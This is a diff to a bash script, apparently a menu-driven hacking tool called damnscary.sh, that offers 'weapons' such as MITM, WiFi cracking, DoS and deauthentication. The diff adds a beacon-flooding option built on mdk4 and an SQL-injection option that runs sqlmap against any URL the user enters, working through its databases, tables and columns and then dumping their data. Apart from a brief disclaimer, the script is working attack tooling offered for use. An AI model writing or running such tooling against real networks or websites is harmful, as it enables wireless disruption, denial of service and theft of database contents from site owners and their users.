@@ -1,8 +1,10 @@
 clear
-yellow=$'\e[1;33m'
-red=$'\e[1;31m'
-green=$'\e[1;32m'
+yellow=$'\e[1;33;40m'
+red=$'\e[1;31;40m'
+green=$'\e[1;32;40m'
 echo "$red"
+clear
+clear
 echo ""
 echo "Before We begin you need to make sure you have the following installed"
 echo ""
@@ -17,6 +19,8 @@ echo ""
 echo "5. arpspoof"
 echo ""
 echo "6. gnome-terminal"
+echo ""
+echo "7. sqlmap"
 echo "------------------------------------------"
 echo ""
 echo ""
@@ -29,19 +33,20 @@ echo ""
 echo "LEGAL DISCLAMER: THIS PROGRAM IS ONLY TO BE USED FOR A GOOD LEARNING TOOL. NOT TO CAUSE ANY TROUBLE OR TO GET YOUR SELF ARRESTED. IF YOU DO USE THIS FOR BAD THINGS; I THE CREATOR WILL NOT TAKE RESPONSIBILITY."
 echo ""
 echo ""
-echo ""
-echo " ____                          ____"
+reverse=$'\e[1;97;41m'
+echo "$reverse"
+echo " ____                          ____                       "
 echo "|  _ \  __ _ _ __ ___  _ __   / ___|  ___ __ _ _ __ _   _ "
 echo "| | | |/ _\ | |_ \ _ \| |_ \  \___ \ / __/ _\ | |__| | | |"
 echo "| |_| | (_| | | | | | | | | |  ___) | (_| (_| | |  | |_| |"
 echo "|____/ \__,_|_| |_| |_|_| |_| |____/ \___\__,_|_|   \__, |"
-echo "                                                    |___/"
-echo " _   _            _    _               _____           _ "
-echo "| | | | __ _  ___| | _(_)_ __   __ _  |_   _|__   ___ | |"
-echo '| |_| |/ _\ |/ __| |/ / | "_ \ / _\ |   | |/ _ \ / _ \| |'
-echo "|  _  | (_| | (__|   <| | | | | (_| |   | | (_) | (_) | |"
-echo "|_| |_|\__,_|\___|_|\_\_|_| |_|\__, |   |_|\___/ \___/|_|"
-echo "                               |___/                     "
+echo "                                                    |___/ "
+echo " _   _            _    _               _____           _  "
+echo "| | | | __ _  ___| | _(_)_ __   __ _  |_   _|__   ___ | | "
+echo '| |_| |/ _\ |/ __| |/ / | "_ \ / _\ |   | |/ _ \ / _ \| | '
+echo "|  _  | (_| | (__|   <| | | | | (_| |   | | (_) | (_) | | "
+echo "|_| |_|\__,_|\___|_|\_\_|_| |_|\__, |   |_|\___/ \___/|_| "
+echo "                               |___/                      "
 echo ""
 echo "$yellow"
 echo "Alright Time to choose your weapon!"
@@ -50,6 +55,8 @@ echo "1. MITM Attack"
 echo "2. AirKiller Program (Used for Cracking WiFi passwords)"
 echo "3. DOS Attack"
 echo "4. Sends deauthentication and disassociation packets"
+echo "5. Beacon Swarm"
+echo "6. SQL Injection"
 echo ""
 echo ""
 read weapon
@@ -95,6 +102,12 @@ then
 		echo "Press enter to move on. When You are ready analyze stuff with wireshark. (It is ran as root just so you know)"
 		read edrfgwsdfghs
 		sudo wireshark
+		echo ""
+		end=$'\e[5;97;41m'
+		echo "$end"
+		echo "Press enter to go to home screen"
+		read sidfhgksjldfhkgjls
+		bash damnscary.sh
 fi
 if [[ $weapon == "2" ]]
 then
@@ -196,6 +209,13 @@ fi
 echo "$yellow"
 echo ''
 echo ' good bye!'
+end=$'\e[5;97;41m'
+echo "$end"
+echo ""
+echo ""
+echo "Press enter to go to home screen"
+read sdfhgsjdfgsg
+bash damnscary.sh
 elif [[ $weapon == "3" ]]
 then
 	clear
@@ -239,6 +259,10 @@ then
 		final=$final" -a $bssid"
 	fi
 	$final
+	echo ""
+	echo "Press enter to go to home screen"
+	read qwertyuilkjhgfdxcv
+	bash damnscary.sh
 fi
 if [[ $weapon == "4" ]]
 then
@@ -327,14 +351,130 @@ then
 	echo "When you are ready press enter and press CTRL+C to stop"
 	read sdfjklghsdfgh
 	$din
-	sudo rm blacklist.txt
-	sudo rm whitelist.txt
+	echo ""
+	echo "Press enter to go back to home screen"
+	read iqweyrqiuhgshdfkjghdhn
+	bash damnscary.sh
 fi
-
-
-
-
-
+if [[ $weapon == "5" ]]
+then
+	blue=$'\e[1;34m'
+	clear
+	echo "$blue"
+	echo ""
+	iwconfig
+	echo ""
+	echo "What is your wireless card?"
+        read card
+        echo ""
+        echo "Do you want to put it into monitor mode?"
+        read mon
+        if [[ $mon == "yes" ]]
+        then
+                sudo airmon-ng start $card
+                clear
+		iwconfig
+		echo ""
+                echo "What is your new wireless card?"
+                read card
+        fi
+        clear
+	echo ""
+	echo "Do you want to specify a SSID you want to use?"
+	read bid
+	if [[ $bid == "yes" ]]
+	then
+		echo ""
+		echo "What is it?"
+		read ib
+		clear
+	fi
+	if [[ $ib == "" ]]
+	then
+		echo ""
+		echo "Do you want to use a SSID list?"
+		read s
+		if [[ $s == "yes" ]]
+		then
+			echo ""
+			echo "1. Use the SSID list that came with the github package"
+			echo "2. Use your own SSID list"
+			read list
+			if [[ $list == "1" ]]
+			then
+				echo ""
+				echo "Ok then we are going to use the SSID list that came with the package"
+			elif [[ $list == "2" ]]
+			then
+				echo ""
+				echo "What is the location of the list?"
+				read lisdir
+            fi
+		fi
+	fi
+	clear
+	echo ""
+	echo ""
+	beacon="sudo mdk4 $card b"
+	if [[ $ib != "" ]]
+	then
+		beacon=$beacon" -n $ib"
+	fi
+	if [[ $s != "" ]]
+	then
+		if [[ $list == "1" ]]
+		then
+			beacon=$beacon" -f CommonSSIDs"
+		elif [[ $list == "2" ]]
+		then
+			beacon=$beacon" -f $lisdir"
+		fi
+	fi
+	echo ""
+	echo "I reccomend monitoring everything by opening another terminal and typing in this command: sudo airodump-ng $card"
+	echo "Press the enter button to begin beacon swarm. Be careful! If you run it too long it can crash your computer!"
+	read beaconswarmonstart
+	$beacon
+	echo ""
+	echo "Press enter to go to home screen"
+	read ajfdgkadhfgjklsdfg
+	bash damnscary.sh
+fi
+if [[ $weapon == "6" ]]
+then
+	clear
+	sql=$'\e[1;33;44m'
+	echo "$sql"
+	clear
+	clear
+	echo "$sql"
+	echo "Ok Lets jump right into it!"
+	echo ""
+	echo "What URL are you attacking?"
+	read url
+	clear
+	sudo sqlmap -u $url --dbs
+	echo "$sql"
+	echo "What database to you want to go into?"
+	read dbs
+	clear
+	sudo sqlmap -u $url -D $dbs --tables
+	echo "$sql"
+	echo "What table do you want to go into?"
+	read table
+	clear
+	sudo sqlmap -u $url -D $dbs -T $table --columns
+	echo "$sql"
+	echo "What column to you want to go into?"
+	read column
+	clear
+	sudo sqlmap -u $url -D $dbs -T $table -C $column --dump
+	echo "$sql"
+	echo "Well There you go!"
+	echo "Press enter to go to home screen"
+	read hellomanhowisitgoingthanksforreadingthiscode
+	bash damnscary.sh
+fi
 
 
 
